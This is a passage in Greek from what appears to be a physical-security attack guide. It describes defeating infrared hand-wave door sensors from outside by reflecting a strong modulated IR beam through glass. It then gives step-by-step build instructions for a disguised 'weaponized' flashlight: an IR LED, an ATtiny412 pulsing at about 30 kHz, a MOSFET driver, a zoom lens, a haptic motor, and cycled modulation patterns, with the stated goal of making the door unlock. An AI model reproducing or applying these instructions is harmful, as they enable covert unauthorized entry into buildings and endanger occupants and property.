- Ο επιτιθέμενος δεν χρειάζεται οπτική επαφή με το άνοιγμα του δέκτη· αν στοχεύσει εσωτερικούς τοίχους, ράφια ή πλαίσια πόρτας που είναι ορατά μέσα από γυαλί, η ανακλώμενη ενέργεια μπορεί να εισέλθει στο οπτικό πεδίο ~30° και να προσομοιώσει μια κίνηση χεριού από κοντινή απόσταση.
- Επειδή οι δέκτες αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να ανακλαστεί σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το κατώφλι ανίχνευσης.

### Φακός επίθεσης οπλισμένος για χρήση
- Η ενσωμάτωση του driver σε έναν εμπορικό φακό κρύβει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με ένα ισχυρό IR LED που ταιριάζει στη ζώνη του δέκτη, προσθέστε ένα ATtiny412 (ή παρόμοιο) για την παραγωγή παλμών ≈30 kHz και χρησιμοποιήστε ένα MOSFET για να απορροφά το ρεύμα του LED.
- Ένας τηλεσκοπικός φακός zoom στενεύει τη δέσμη για μεγαλύτερη εμβέλεια και ακρίβεια, ενώ ένα μοτέρ δόνησης υπό τον έλεγχο του MCU παρέχει απτική επιβεβαίωση ότι η διαμόρφωση είναι ενεργή, χωρίς εκπομπή ορατού φωτός.
- Η εναλλαγή μεταξύ πολλών αποθηκευμένων μοτίβων διαμόρφωσης (με ελαφρώς διαφορετικές συχνότητες φέροντος κύματος και περιβλήματα) αυξάνει τη συμβατότητα με διαφορετικές οικογένειες αισθητήρων που πωλούνται με άλλη επωνυμία. Έτσι, ο χειριστής μπορεί να σαρώσει ανακλαστικές επιφάνειες μέχρι να ακουστεί το κλικ του relay και να απασφαλίσει η πόρτα.
